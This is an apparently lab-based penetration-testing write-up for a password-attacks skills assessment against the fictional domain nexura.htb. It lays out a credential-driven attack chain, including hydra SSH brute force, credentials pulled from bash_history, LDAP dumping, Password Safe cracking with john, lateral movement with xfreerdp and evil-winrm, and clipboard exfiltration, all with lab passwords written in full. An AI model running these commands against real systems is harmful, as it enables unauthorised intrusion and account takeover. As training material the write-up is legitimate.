# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 (DMZ01) → 172.16.119.0/24 (Internal)  
> **Domain:** nexura.htb  
> **Status:** RDP session active on JUMP01 — credential hunting in progress  
> **Updated:** 2026-04-19 14:50 UTC+8

---

## Executive Summary

| Phase | Status | Key Finding |
|-------|--------|-------------|
| Foothold | ✅ Complete | jbetty / Texas123!@# via SSH brute force |
| Credential Discovery | ✅ Complete | hwilliam / dealer-screwed-gym1 (bash_history) |
| Domain Enumeration | ✅ Complete | LDAP dump reveals 3 hosts, Domain Admin: stom |
| Pivot | ✅ Complete | ligolo-ng tunnel to internal network |
| Privilege Escalation | ✅ **COMPLETE** | RDP session → Password Safe cracked → **Domain Admin creds** |
| Flags | 🔄 **In Progress** | DC01 access via stom credentials |

---

## 1. Foothold — DMZ01

### Initial Access
```bash
echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
# Result: jbetty / Texas123!@#
```

### Key Finding — Credential in bash_history
```bash
cat /home/jbetty/.bash_history | grep sshpass
# sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

| Credential | Value | Source |
|------------|-------|--------|
| Username | `hwilliam` | bash_history |
| Password | `dealer-screwed-gym1` | bash_history |

### Network Position
| Interface | IP | Network | Purpose |
|-----------|-----|---------|---------|
| ens160 | 10.129.234.116 | 10.129.0.0/16 | External/VPN |
| ens192 | 172.16.119.13 | 172.16.119.0/24 | **Internal pivot** |

---

## 2. Domain Enumeration

### LDAP Dump Results
```bash
proxychains ldapdomaindump -u 'nexura.htb\hwilliam' -p 'dealer-screwed-gym1' 172.16.119.11
```

**Domain:** nexura.htb  
**Domain Controller:** DC01 (172.16.119.11)

### Domain Users
| User | Name | Groups | Status |
|------|------|--------|--------|
| `Administrator` | — | Domain Admins, Enterprise Admins, Schema Admins | Target |
| `stom` | Tom Sandy | **Domain Admins**, MANAGEMENT | **🎯 Domain Admin** |
| `hwilliam` | William Hallam | HR | Current access |
| `bdavid` | David Brittni | IT | — |

### Domain Computers (DNS Resolved)
| Host | FQDN | IP | OS | Role |
|------|------|-----|-----|------|
| **JUMP01** | JUMP01.nexura.htb | **172.16.119.7** | Windows Server 2019 | **Jump Host** 🎯 |
| FILE01 | FILE01.nexura.htb | 172.16.119.10 | Windows Server 2019 | File Server |
| DC01 | DC01.nexura.htb | 172.16.119.11 | Windows Server 2019 | Domain Controller |

**Key Discovery:** FILE01 is at **.10**, DC01 at **.11** — separate hosts.

### Password Policy
```ini
LockoutBadCount = 0    # No account lockout!
MinimumPasswordLength = 7
PasswordComplexity = 1
```

---

## 3. Failed Attack Vectors Summary (hwilliam Context)

| Attack | Tool/Method | Result | Reason |
|--------|-------------|--------|--------|
| WinRM | evil-winrm | ❌ Failed | Authorization error |
| SMB Write | psexec | ❌ Failed | ADMIN$/C$ not writable |
| WMI | wmiexec | ❌ Failed | rpc_s_access_denied |
| RDP (proxychains) | xfreerdp | ❌ Failed | Kerberos realm error |
| Kerberoasting | GetUserSPNs | ❌ Failed | No user SPNs (only krbtgt) |
| AS-REP Roasting | GetNPUsers | ❌ Failed | No UF_DONT_REQUIRE_PREAUTH |
| Password Spray | netexec (3 passwords) | ❌ Failed | No matches |
| GPP Passwords | SYSVOL enumeration | ❌ Failed | No Preferences folders |

**Position:** hwilliam (HR group) has read-only SMB/LDAP access. Cannot execute code remotely.

---

## 4. Breakthrough — JUMP01 Access

### Discovery
- **Method:** LDAP domain_computers.json analysis
- **Host:** JUMP01.nexura.htb (172.16.119.7)
- **Role:** Jump Host (OU=Jumphosts) — where admins RDP to manage network

### RDP Connection — SUCCESS
```bash
xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /cert:ignore
```
**Status:** ✅ Active RDP session

### Network Topology
```
┌─────────────────────────────────────────────────────────────┐
│                    External (VPN)                            │
│                      10.129.x.x                              │
└───────────────────────────┬─────────────────────────────────┘
                            │
                    SSH port 22
                            │
┌───────────────────────────▼─────────────────────────────────┐
│                   DMZ01 (Ubuntu)                             │
│              10.129.234.116 / 172.16.119.13                  │
│                   jbetty (foothold)                          │
└───────────────────────────┬─────────────────────────────────┘
                            │ Internal 172.16.119.0/24
        ┌───────────────────┼───────────────────┐
        │                   │                   │
   RDP 3389             SMB 445             DNS 53
        │                   │                   │
┌───────▼──────┐  ┌────────▼────────┐  ┌──────▼──────┐
│   JUMP01     │  │   FILE01       │  │   DC01      │
│172.16.119.7  │  │172.16.119.10   │  │172.16.119.11│
│ Jump Host    │  │ File Server    │  │  Domain     │
│ 🎯 TARGET    │  │                │  │ Controller  │
└──────────────┘  └─────────────────┘  └─────────────┘
```

---

## 5. Current Status — JUMP01 RDP Session

**Host:** JUMP01 (172.16.119.7)  
**Access:** hwilliam via RDP  
**Objective:** ✅ Find cached credentials for privilege escalation — **ACHIEVED**

### 🔐 Critical Discovery — Password Safe Database

**Location:** `\\file01\HR\Archive\Employee-Passwords_OLD.psafe3`

**Exfiltration Method:** RDP clipboard (copy-paste to Kali VPS)

**Cracking Process:**
```bash
# Extract hash from Password Safe v3 database
pwsafe2john Employee-Passwords_OLD.psafe3 > pwhash.txt

# Crack with John the Ripper (format: pwsafe)
john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt pwhash.txt

# Result: ~38 seconds to crack master password
```

**Master Password:** `michaeljackson`

### Compromised Credentials (4 accounts)

| User | Password | Name | Access Level | Status |
|------|----------|------|--------------|--------|
| `jbetty` | `xiao-nicer-wheels5` | Betty Jayde | Domain User | ✅ Already compromised |
| `bdavid` | `caramel-cigars-reply1` | David Brittni | IT Group | 🔍 **New** |
| `stom` | `fails-nibble-disturb4` | Tom Sandy | **Domain Admins** | 🎯 **PRIVILEGE ESCALATION** |
| `hwilliam` | `warned-wobble-occur8` | William Hallam | HR Group | 🔍 New password (differs from bash_history) |

**Key Finding:** `stom` is a **Domain Admin** — full domain compromise now possible.

### Why This Matters

| Credential | Strategic Value |
|------------|-----------------|
| `stom` / `fails-nibble-disturb4` | **Domain Admin** — can access DC01, extract NTDS.dit, compromise any account |
| `bdavid` / `caramel-cigars-reply1` | IT Group member — potential server admin access |
| `hwilliam` (updated) | HR access to sensitive shares |

---

## 6. Next Steps

1. ✅ ~~Check Credential Manager for Domain Admin credentials~~ — **DONE via Password Safe**
2. ✅ ~~Pivot to Domain Admin~~ — **ACHIEVED** (`stom` credentials)
3. 🔄 **Access DC01** via RDP or SMB using `stom` / `fails-nibble-disturb4`
4. 🔄 **Extract flags** from DC01:
   - `user.txt` — likely on FILE01 or JUMP01
   - `root.txt` — typically on DC01 (Domain Controller)
5. 🔄 **Optional:** Dump NTDS.dit for full credential harvest
6. 🔄 **Optional:** Compromise remaining hosts (bdavid IT access)

### Immediate Action — DC01 Access
```bash
# Test Domain Admin credentials against DC01
proxychains crackmapexec smb 172.16.119.11 -u stom -p 'fails-nibble-disturb4'

# RDP to DC01 as Domain Admin
proxychains xfreerdp /v:172.16.119.11 /u:stom /p:'fails-nibble-disturb4' /cert:ignore /d:nexura.htb

# Or evil-winrm (if WinRM enabled)
proxychains evil-winrm -i 172.16.119.11 -u stom -p 'fails-nibble-disturb4'
```

---

## Appendix A: Full Credential Inventory

| Account | Password | Source | Privileges | Compromised |
|---------|----------|--------|------------|-------------|
| `jbetty` | `Texas123!@#` | SSH brute force | DMZ01 foothold | ✅ 2026-04-18 |
| `hwilliam` | `dealer-screwed-gym1` | bash_history | HR user, FILE01 access | ✅ 2026-04-18 |
| `hwilliam` | `warned-wobble-occur8` | Password Safe | HR user (alternate cred) | ✅ 2026-04-19 |
| `bdavid` | `caramel-cigars-reply1` | Password Safe | IT Group | ✅ 2026-04-19 |
| `stom` | `fails-nibble-disturb4` | Password Safe | **Domain Admin** | ✅ 2026-04-19 🎯 |

**Attack Chain:** jbetty → hwilliam (bash_history) → JUMP01 RDP → Password Safe → **Domain Admin (stom)**

---

## Lessons Learned

- **Jump hosts are gold:** JUMP01 (not in initial ping sweep) revealed via LDAP enumeration
- **DNS from foothold:** DMZ01 can query DC01 DNS directly — resolved all host IPs
- **Ligolo-ng > proxychains:** RDP Kerberos issues resolved with TUN interface
- **ICMP blocked:** Ping sweep misses Windows hosts (firewall), but TCP services work
- **Password Safe databases:** HR shares contain credential goldmines — always check `.psafe3` files
- **RDP clipboard exfiltration:** Simple copy-paste bypasses egress restrictions for small files

---

*Updated: 2026-04-19 18:05 UTC+8*
